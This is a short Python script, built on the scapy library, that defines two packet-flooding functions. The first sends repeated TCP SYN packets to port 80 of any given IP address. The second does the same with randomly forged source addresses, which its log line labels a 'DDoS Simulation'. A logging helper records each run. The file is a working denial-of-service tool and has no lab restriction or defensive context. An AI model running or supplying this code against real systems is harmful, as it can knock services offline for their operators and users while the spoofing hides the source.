from scapy.all import IP, TCP, send, get_if_list
import random
from datetime import datetime

def log_action(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("log.txt", "a") as f:
        f.write(f"[{timestamp}] {message}\n")

def get_default_iface():
    interfaces = get_if_list()
    if interfaces:
        return interfaces[0]
    return "lo" 

def syn_flood(target_ip, count=100):
    iface = get_default_iface()
    for _ in range(count):
        packet = IP(dst=target_ip) / TCP(dport=80, flags="S")
        send(packet, iface=iface, verbose=0)
    log_action(f"SYN Flood: Sent {count} packets to {target_ip} via {iface}")

def ddos_attack(target_ip, count=100):
    iface = get_default_iface()
    for _ in range(count):
        spoofed_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=80, flags="S")
        send(packet, iface=iface, verbose=0)
    log_action(f"DDoS Simulation: Sent {count} spoofed packets to {target_ip} via {iface}")
